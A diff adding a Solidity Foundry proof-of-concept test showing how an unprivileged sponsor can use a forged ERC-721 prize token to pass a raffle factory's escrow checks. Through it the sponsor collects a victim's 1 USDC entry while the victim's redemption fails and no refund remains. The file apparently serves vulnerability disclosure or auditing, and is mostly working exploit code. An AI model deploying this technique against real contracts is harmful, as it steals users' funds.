@@ -1,0 +1,217 @@
+diff --git a/packages/contracts/test/foundry/ForgedPrizeEscrowPoC.t.sol b/packages/contracts/test/foundry/ForgedPrizeEscrowPoC.t.sol
+new file mode 100644
+index 0000000..880d231
+--- /dev/null
++++ b/packages/contracts/test/foundry/ForgedPrizeEscrowPoC.t.sol
+@@ -0,0 +1,211 @@
++// SPDX-License-Identifier: MIT
++pragma solidity 0.8.36;
++
++/*
++Reproduction (from packages/contracts):
++  forge test --match-contract ForgedPrizeEscrowPoC -vv
++
++Attacker model: an unprivileged raffle sponsor controls the address supplied as
++`prizeToken`. The contract below lies about ERC-165 support and ERC-721
++ownership, invokes the expected receiver callback itself, and refuses the later
++prize delivery. The victim controls only their normal entry purchase.
++
++Impact demonstrated by the test: the forged raffle is canonical and Active,
++the victim's 1 USDC entry is accepted, and after the NFT-winning resolution the
++attacker receives the 0.95 USDC sponsor payout while retaining control of the
++purported prize. The victim's redemption reverts and no winner/refund balance
++remains available.
++*/
++
++import { IERC721 } from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
++import { IERC721Receiver } from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
++
++import { RaffleFactory } from "../../src/RaffleFactory.sol";
++import { IRaffle } from "../../src/interfaces/IRaffle.sol";
++import { IRaffleFactory } from "../../src/interfaces/IRaffleFactory.sol";
++
++interface Vm {
++    function prank(address sender) external;
++    function warp(uint256 newTimestamp) external;
++}
++
++interface IVrfConsumer {
++    function rawFulfillRandomWords(uint256 requestId, uint256[] calldata randomWords) external;
++}
++
++/// @dev Minimal six-decimal quote token needed to exercise the real raffle accounting and transfers.
++contract PoCQuoteToken {
++    string public constant name = "USD Coin";
++    string public constant symbol = "USDC";
++    uint8 public constant decimals = 6;
++
++    mapping(address account => uint256) public balanceOf;
++    mapping(address owner => mapping(address spender => uint256)) public allowance;
++
++    function mint(address to, uint256 amount) external {
++        balanceOf[to] += amount;
++    }
++
++    function approve(address spender, uint256 amount) external returns (bool) {
++        allowance[msg.sender][spender] = amount;
++        return true;
++    }
++
++    function transfer(address to, uint256 amount) external returns (bool) {
++        _transfer(msg.sender, to, amount);
++        return true;
++    }
++
++    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
++        uint256 approved = allowance[from][msg.sender];
++        require(approved >= amount, "allowance");
++        if (approved != type(uint256).max) allowance[from][msg.sender] = approved - amount;
++        _transfer(from, to, amount);
++        return true;
++    }
++
++    function _transfer(address from, address to, uint256 amount) private {
++        require(balanceOf[from] >= amount, "balance");
++        balanceOf[from] -= amount;
++        balanceOf[to] += amount;
++    }
++}
++
++/// @dev Local deterministic stand-in for the factory's trusted wrapper, solely to drive the real callback boundary.
++contract PoCVrfWrapper {
++    uint256 public lastRequestId;
++    address public requester;
++
++    function link() external pure returns (address) {
++        return address(0x1111);
++    }
++
++    function calculateRequestPriceNative(uint32, uint32) external pure returns (uint256) {
++        return 0;
++    }
++
++    function estimateRequestPriceNative(uint32, uint32, uint256) external pure returns (uint256) {
++        return 0;
++    }
++
++    function requestRandomWordsInNative(uint32, uint16, uint32, bytes calldata)
++        external
++        payable
++        returns (uint256 requestId)
++    {
++        requester = msg.sender;
++        requestId = ++lastRequestId;
++    }
++
++    function fulfill(uint256 requestId, uint256 randomWord) external {
++        uint256[] memory words = new uint256[](1);
++        words[0] = randomWord;
++        IVrfConsumer(requester).rawFulfillRandomWords(requestId, words);
++    }
++}
++
++/// @dev Attacker-selected "ERC-721" whose ownership reports are not backed by an NFT state machine.
++contract ForgedPrizeToken {
++    error PrizeNeverEscrowed();
++
++    address public immutable attackerController;
++    address private reportedOwner;
++
++    constructor(address attacker) {
++        attackerController = attacker;
++        reportedOwner = attacker;
++    }
++
++    function supportsInterface(bytes4 interfaceId) external pure returns (bool) {
++        return interfaceId == 0x80ac58cd;
++    }
++
++    function ownerOf(uint256 tokenId) external view returns (address) {
++        require(tokenId == 1, "unknown token");
++        return reportedOwner;
++    }
++
++    function safeTransferFrom(address from, address to, uint256 tokenId) external {
++        // Forge only the observations made by RaffleFactory/Raffle. No asset or
++        // attacker control is transferred to `to`.
++        reportedOwner = to;
++        bytes4 accepted = IERC721Receiver(to).onERC721Received(msg.sender, from, tokenId, "");
++        require(accepted == IERC721Receiver.onERC721Received.selector, "receiver rejected");
++    }
++
++    function transferFrom(address, address, uint256) external pure {
++        revert PrizeNeverEscrowed();
++    }
++}
++
++contract ForgedPrizeEscrowPoC {
++    Vm private constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
++
++    address private constant VICTIM = address(0xB0B);
++    address private constant TREASURY = address(0x7007);
++    uint256 private constant ENTRY_PRICE = 1_000_000;
++
++    function test_ForgedEscrowStealsVictimPaymentAndBlocksPrizeRedemption() external {
++        PoCQuoteToken usdc = new PoCQuoteToken();
++        PoCVrfWrapper wrapper = new PoCVrfWrapper();
++        RaffleFactory factory = new RaffleFactory(address(usdc), address(wrapper), TREASURY);
++        ForgedPrizeToken fakePrize = new ForgedPrizeToken(address(this));
++
++        uint64 endTime = uint64(block.timestamp + 1 days);
++        address raffleAddress = factory.createRaffle(
++            IRaffleFactory.CreateRaffleParams({
++                sponsorRecipient: address(this),
++                prizeToken: address(fakePrize),
++                prizeTokenId: 1,
++                reserveEntries: 1,
++                endTime: endTime
++            })
++        );
++        IRaffle raffle = IRaffle(raffleAddress);
++
++        // The malicious token manufactured both attestations checked by the factory.
++        require(factory.isRaffle(raffleAddress), "raffle not canonically registered");
++        require(raffle.status() == IRaffle.Status.Active, "forged raffle not active");
++        require(fakePrize.ownerOf(1) == raffleAddress, "forged ownerOf did not fool factory");
++        require(fakePrize.attackerController() == address(this), "attacker lost control");
++
++        // A normal victim buys the only ticket with real quote tokens.
++        usdc.mint(VICTIM, ENTRY_PRICE);
++        vm.prank(VICTIM);
++        usdc.approve(raffleAddress, ENTRY_PRICE);
++        vm.prank(VICTIM);
++        uint256 ticketId = raffle.buyEntries(VICTIM, 1);
++        require(ticketId == 1, "unexpected ticket");
++        require(usdc.balanceOf(raffleAddress) == ENTRY_PRICE, "victim payment not collected");
++
++        // Exercise the real request/callback paths. One sold entry meets the reserve,
++        // so every random word resolves to the NFT-winning outcome.
++        vm.warp(endTime);
++        uint256 requestId = raffle.requestDraw();
++        wrapper.fulfill(requestId, 0);
++        require(raffle.status() == IRaffle.Status.NftWon, "raffle did not resolve NftWon");
++
++        // Settlement never revalidates custody and immediately allocates 95% to the attacker.
++        raffle.settleWinningTicket(ticketId);
++        require(raffle.sponsorProceeds() == 950_000, "95% sponsor allocation missing");
++        require(raffle.winnerProceeds() == 0, "winner unexpectedly has a cash claim");
++        raffle.releaseSponsorProceeds();
++        require(usdc.balanceOf(address(this)) == 950_000, "attacker did not receive victim funds");
++        require(fakePrize.attackerController() == address(this), "prize control changed");
++
++        // Prize redemption reaches the attacker-controlled token and reverts atomically.
++        vm.prank(VICTIM);
++        (bool redeemed, bytes memory reason) =
++            raffleAddress.call(abi.encodeCall(IRaffle.redeemWinningTicket, (ticketId)));
++        require(!redeemed, "victim unexpectedly redeemed the nonexistent prize");
++        require(reason.length >= 4 && bytes4(reason) == ForgedPrizeToken.PrizeNeverEscrowed.selector, "wrong revert");
++        require(!raffle.winnerRedeemed(), "failed redemption changed raffle state");
++        require(IERC721(raffleAddress).ownerOf(ticketId) == VICTIM, "failed redemption burned the ticket");
++        require(usdc.balanceOf(VICTIM) == 0, "victim was refunded");
++        require(usdc.balanceOf(raffleAddress) == 50_000, "only protocol fee should remain");
++
++        (bool refundsEnabled,) = raffleAddress.call(abi.encodeWithSelector(IRaffle.enableRefunds.selector));
++        require(!refundsEnabled, "terminal NFT result unexpectedly allowed refunds");
++        require(raffle.remainingRefundLiability() == 0, "victim unexpectedly has a refund claim");
++    }
++}
